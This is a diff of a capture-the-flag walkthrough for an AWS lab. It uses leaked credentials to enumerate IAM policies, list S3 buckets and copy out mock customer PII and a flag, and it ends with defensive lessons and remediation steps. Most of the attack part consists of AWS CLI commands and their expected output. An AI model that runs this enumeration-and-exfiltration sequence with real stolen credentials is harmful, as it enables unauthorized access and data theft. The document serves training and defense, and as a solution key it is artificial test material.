@@ -1,30 +1,28 @@
-# S3 Data Heist - Walkthrough
+# Walkthrough
 
-> **Spoiler Warning**: This document contains the complete solution.
+## Step 1: AWS CLI Configuration
 
-## Attack Path
+Configure AWS CLI with the leaked credentials from the GitHub repository.
 
-```mermaid
-flowchart TB
-    A[Leaked Credentials] --> B[sts:GetCallerIdentity]
-    B --> C[iam:ListUserPolicies]
-    C --> D[iam:GetUserPolicy]
-    D --> E[iam:ListAttachedUserPolicies]
-    E --> F[iam:ListGroupsForUser]
-    F --> G{Groups exist?}
-    G -->|Yes| H[iam:ListGroupPolicies]
-    H --> I[iam:GetGroupPolicy]
-    I --> J[iam:ListAttachedGroupPolicies]
-    J --> K[s3:ListAllMyBuckets]
-    G -->|No| K
-    K --> L[s3:ListBucket]
-    L --> M[s3:GetObject]
-    M --> N[FLAG]
+```bash
+# Get credentials from Terraform output
+cd terraform
+terraform output -json leaked_credentials
 ```
 
-## Step 1: Identity Confirmation
+Configure a profile with the credentials:
 
-First, verify who you are with the compromised credentials.
+```bash
+aws configure --profile victim
+# AWS Access Key ID: <from output>
+# AWS Secret Access Key: <from output>
+# Default region name: us-east-1
+# Default output format: json
+```
+
+## Step 2: Identity Verification
+
+Verify who you are with the compromised credentials.
 
 ```bash
 aws sts get-caller-identity --profile victim
@@ -48,11 +46,11 @@ Note the username `gnawlab-s3heist-user-xxxxxxxx` from the ARN - you'll need it 
 
 ---
 
-## Step 2: Permission Enumeration
+## Step 3: IAM Permission Enumeration
 
 Now systematically enumerate all permissions available to this user.
 
-### 2.1 List User Inline Policies
+### 3.1 List User Inline Policies
 
 Check for inline policies directly attached to the user.
 
@@ -73,7 +71,7 @@ Expected output:
 
 An inline policy `gnawlab-s3heist-policy-xxxxxxxx` was discovered.
 
-### 2.2 Get Inline Policy Details
+### 3.2 Get Inline Policy Details
 
 Retrieve the actual permissions from the discovered inline policy.
 
@@ -146,7 +144,7 @@ Expected output:
 
 **Important**: The S3DataAccess statement reveals access to a specific bucket `gnawlab-s3heist-data-xxxxxxxx`.
 
-### 2.3 List Attached Policies
+### 3.3 List Attached Policies
 
 Check for managed policies attached to the user.
 
@@ -165,7 +163,7 @@ Expected output:
 
 No managed policies attached.
 
-### 2.4 Check Group Membership
+### 3.4 Check Group Membership
 
 Check if the user belongs to any groups.
 
@@ -188,11 +186,11 @@ The user doesn't belong to any groups, so group policy enumeration is not needed
 
 ---
 
-## Step 3: S3 Bucket Enumeration
+## Step 4: S3 Bucket Enumeration
 
 Based on the permission enumeration, we confirmed S3 access. Let's explore the buckets.
 
-### 3.1 List All Buckets
+### 4.1 List All Buckets
 
 ```bash
 aws s3 ls --profile victim
@@ -205,7 +203,7 @@ Expected output:
 
 > **Note**: Other buckets may exist in the account, but the target is `gnawlab-s3heist-data-xxxxxxxx` as identified in the policy.
 
-### 3.2 List Bucket Contents
+### 4.2 List Bucket Contents
 
 ```bash
 aws s3 ls s3://gnawlab-s3heist-data-xxxxxxxx/ --recursive --profile victim
@@ -229,11 +227,11 @@ Expected output:
 
 ---
 
-## Step 4: Data Exfiltration
+## Step 5: Data Exfiltration
 
 Exfiltrate the discovered files.
 
-### 4.1 Read the README
+### 5.1 Read the README
 
 ```bash
 aws s3 cp s3://gnawlab-s3heist-data-xxxxxxxx/README.txt - --profile victim
@@ -253,7 +251,7 @@ Directory Structure:
 - /confidential - Restricted access
 ```
 
-### 4.2 Exfiltrate Customer Data
+### 5.2 Exfiltrate Customer Data
 
 ```bash
 aws s3 cp s3://gnawlab-s3heist-data-xxxxxxxx/data/customers.csv - --profile victim
@@ -270,7 +268,7 @@ id,name,email,ssn,credit_card
 
 **Sensitive Data Found**: SSN, credit card numbers, and other PII exposed.
 
-### 4.3 Read Internal Memo
+### 5.3 Read Internal Memo
 
 ```bash
 aws s3 cp s3://gnawlab-s3heist-data-xxxxxxxx/internal/memo.txt - --profile victim
@@ -299,7 +297,7 @@ Please address these items by end of Q1.
 
 ---
 
-## Step 5: Capture the Flag
+## Step 6: Flag Extraction
 
 Finally, retrieve the flag from the confidential directory.
 
@@ -312,50 +310,134 @@ Output:
 FLAG{s3_bucket_enum_and_exfil_complete}
 ```
 
-**Congratulations!** You have successfully completed the scenario.
+---
+
+## Attack Chain Summary
+
+```
+1. Leaked Credentials (GitHub repository)
+   ↓ Configure AWS CLI profile
+2. sts:GetCallerIdentity
+   ↓ Confirm identity, extract username
+3. iam:ListUserPolicies
+   ↓ Discover inline policy name
+4. iam:GetUserPolicy
+   ↓ Analyze policy - find S3 access permissions
+5. iam:ListAttachedUserPolicies
+   ↓ Confirm no managed policies attached
+6. iam:ListGroupsForUser
+   ↓ Confirm no group membership
+7. s3:ListAllMyBuckets
+   ↓ Discover target bucket
+8. s3:ListBucket
+   ↓ Enumerate bucket contents
+9. s3:GetObject
+   ↓
+10. FLAG{s3_bucket_enum_and_exfil_complete}
+```
 
 ---
 
-## Summary
+## Key Techniques
 
-Attack steps performed in this scenario:
+### IAM User Permission Enumeration
 
-| Step | Action | AWS API |
-|------|--------|---------|
-| 1 | Identity verification | `sts:GetCallerIdentity` |
-| 2 | List inline policies | `iam:ListUserPolicies` |
-| 3 | Get policy details | `iam:GetUserPolicy` |
-| 4 | Check managed policies | `iam:ListAttachedUserPolicies` |
-| 5 | Check group membership | `iam:ListGroupsForUser` |
-| 6 | List all buckets | `s3:ListAllMyBuckets` |
-| 7 | List bucket contents | `s3:ListBucket` |
-| 8 | Exfiltrate data | `s3:GetObject` |
+```bash
+# Full enumeration sequence for IAM Users
+aws sts get-caller-identity
+aws iam list-user-policies --user-name <username>
+aws iam get-user-policy --user-name <username> --policy-name <policy>
+aws iam list-attached-user-policies --user-name <username>
+aws iam list-groups-for-user --user-name <username>
+
+# If groups exist, also enumerate:
+aws iam list-group-policies --group-name <group>
+aws iam get-group-policy --group-name <group> --policy-name <policy>
+aws iam list-attached-group-policies --group-name <group>
+```
+
+### IAM User vs IAM Role Enumeration
+
+| | IAM User | IAM Role |
+|---|---|---|
+| Identity Check | `sts:GetCallerIdentity` | `sts:GetCallerIdentity` |
+| Inline Policies | `iam:ListUserPolicies` | `iam:ListRolePolicies` |
+| Policy Details | `iam:GetUserPolicy` | `iam:GetRolePolicy` |
+| Managed Policies | `iam:ListAttachedUserPolicies` | `iam:ListAttachedRolePolicies` |
+| Group Membership | `iam:ListGroupsForUser` | N/A |
 
 ---
 
-## Real-World Lessons
+## Lessons Learned
 
-### Attacker Perspective
-- Always start with permission enumeration when you have leaked credentials
-- IAM policies often reveal hints about accessible resources
-- S3 buckets are treasure troves of sensitive data
+### 1. Credential Hygiene
+- Never hardcode credentials in source code
+- Use environment variables or secrets management
+- Implement pre-commit hooks to detect secrets
+- Rotate credentials regularly
 
-### Defender Perspective
-- **Credential Hygiene**: Never hardcode credentials in source code
-- **Least Privilege**: IAM policies should grant minimum necessary permissions
-- **S3 Security**: Enable bucket logging and use bucket policies to restrict access
-- **Detection**: Monitor CloudTrail for unusual API call patterns
+### 2. Least Privilege Principle
+- IAM policies should grant minimum necessary permissions
+- Avoid wildcard (`*`) in Resource fields
+- Use resource-level restrictions where possible
+- Regular access reviews and cleanup
 
-### Detectable CloudTrail Events
+### 3. S3 Security
+- Enable bucket logging for audit trails
+- Use bucket policies to restrict access by IP/VPC
+- Enable versioning for data recovery
+- Consider S3 Object Lock for compliance
+
+### 4. Detection and Monitoring
+- Monitor CloudTrail for unusual API patterns
+- Alert on rapid IAM enumeration sequences
+- Track S3 data access patterns
+- Use GuardDuty for anomaly detection
+
+---
+
+## Remediation
+
+### Secure Credential Management
+
+```bash
+# Use AWS Secrets Manager or Parameter Store
+aws secretsmanager create-secret --name MyAppCredentials --secret-string '{"key":"value"}'
+
+# Or use environment variables (never commit to git)
+export AWS_ACCESS_KEY_ID=...
+export AWS_SECRET_ACCESS_KEY=...
 ```
-sts:GetCallerIdentity
-iam:ListUserPolicies
-iam:GetUserPolicy
-iam:ListAttachedUserPolicies
-iam:ListGroupsForUser
-s3:ListAllMyBuckets
-s3:ListBucket
-s3:GetObject
+
+### Least Privilege IAM Policy
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": ["s3:GetObject"],
+      "Resource": "arn:aws:s3:::specific-bucket/specific-prefix/*"
+    }
+  ]
+}
 ```
 
-A sequence of these API calls in rapid succession is a strong indicator of credential compromise and permission enumeration.
+### Pre-commit Hook for Secret Detection
+
+```bash
+# Install git-secrets
+brew install git-secrets
+
+# Configure for AWS patterns
+git secrets --register-aws
+git secrets --install
+```
+
+### Additional Security Measures
+
+1. **AWS Config Rules**: Detect overly permissive IAM policies
+2. **CloudTrail + CloudWatch Alarms**: Alert on sensitive API calls
+3. **GuardDuty**: Enable for credential compromise detection
+4. **S3 Access Analyzer**: Identify unintended public access
